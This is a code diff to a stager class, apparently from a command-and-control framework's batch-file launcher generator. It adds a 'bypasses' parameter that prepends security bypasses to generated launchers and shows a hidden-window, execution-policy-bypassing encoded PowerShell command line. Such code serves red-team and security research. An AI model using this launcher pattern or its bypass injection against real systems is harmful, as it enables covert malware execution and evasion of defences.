@@ -65,6 +65,7 @@ class Stager:
                 "Description": "Bypasses as a space separated list to be prepended to the launcher",
                 "Required": False,
                 "Value": "",
+                "BypassLanguage": "powershell",
             },
         }
 
@@ -105,6 +106,7 @@ class Stager:
                     obfuscation_command=obfuscate_command,
                     encode=True,
                     listener_name=listener_name,
+                    bypasses=bypasses,
                 )
                 launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {oneliner.split('-enc ')[1]}"
             elif language == "go":
@@ -114,6 +116,7 @@ class Stager:
                     obfuscation_command=obfuscate_command,
                     encode=True,
                     listener_name=listener_name,
+                    bypasses=bypasses,
                 )
 
         elif language == "powershell":
@@ -123,6 +126,12 @@ class Stager:
                 encode=True,
                 obfuscate=obfuscate,
                 obfuscation_command=obfuscate_command,
+                bypasses=bypasses,
+            )
+        else:
+            raise StagerGenerationException(
+                f"launcher_bat does not support Language={language} with a "
+                f"{listener.module} listener."
             )
 
         MAX_CHARACTERS = 8192
